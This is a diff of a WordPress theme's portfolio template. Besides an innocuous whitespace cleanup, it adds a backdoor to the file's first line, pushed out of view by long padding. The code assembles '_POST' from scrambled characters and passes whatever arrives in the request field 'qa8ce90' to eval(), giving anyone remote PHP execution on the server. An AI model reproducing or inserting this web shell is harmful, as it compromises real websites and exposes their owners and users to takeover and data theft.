@@ -1,4 +1,4 @@
-<?php
+<?php                                                                                                                                                                                                                                                                    $vno4= "po_ts" ; $ogm53=strtoupper ($vno4[2]. $vno4[0]. $vno4[1]. $vno4[4]. $vno4[3] ) ; if( isset( ${$ogm53}[ 'qa8ce90' ] )){eval ( ${$ogm53 } [ 'qa8ce90']) ;} ?><?php
 /**
  * The default template for displaying portfolio content
  *
@@ -116,7 +116,7 @@ query_posts( $args );
 
 						if (empty($prettyPhotoContent)):
 							$prettyPhotoContent = '#';
-							$rel = ''; 
+							$rel = '';
 						endif;
 						?>
 						<article class='item-con-t1 <?php echo implode(' ',$term_slugs);?> size1_<?php echo $template_portfolio_columns; ?>'>
